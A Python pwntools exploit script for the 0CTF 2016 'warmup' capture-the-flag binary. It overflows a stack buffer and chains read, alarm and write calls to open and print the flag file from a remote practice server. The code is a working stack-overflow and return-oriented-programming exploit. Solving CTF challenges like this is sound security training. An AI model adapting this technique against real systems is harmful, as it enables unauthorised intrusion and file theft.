from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('warmup')
io = remote('node4.buuoj.cn', 26830)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.23.so')
elf = ELF('warmup')
alarm = 0x0804810D
read = 0x0804811D
write = 0x08048135
vuln = 0x0804815A
data = 0x08049000
gadget = 0x08048122

# read(0, data, 0x40), vuln()
payload = cyclic(0x20) + p32(read) + p32(vuln) + p32(0) + p32(data) + p32(0x40)
io.sendafter('Welcome to 0CTF 2016!\n', payload)
io.sendafter('Good Luck!\n', b'/flag\x00')


sleep(5)
# alarm(1234), open(data, 0), vuln()
payload = cyclic(0x20) + p32(alarm) + p32(gadget) + p32(vuln) + p32(data) + p32(0)
io.send(payload)

# read(3, data, 0x40), vuln()
payload = cyclic(0x20) + p32(read) + p32(vuln) + p32(3) + p32(data) + p32(0x40)
io.sendafter('Good Luck!\n', payload)

# write(1, data, 0x40), vuln()
payload = cyclic(0x20) + p32(write) + p32(vuln) + p32(1) + p32(data) + p32(0x40)
io.sendafter('Good Luck!\n', payload)

io.recvuntil('Good Luck!\n')
flag = io.recvline()[:-1]
log.success(flag)
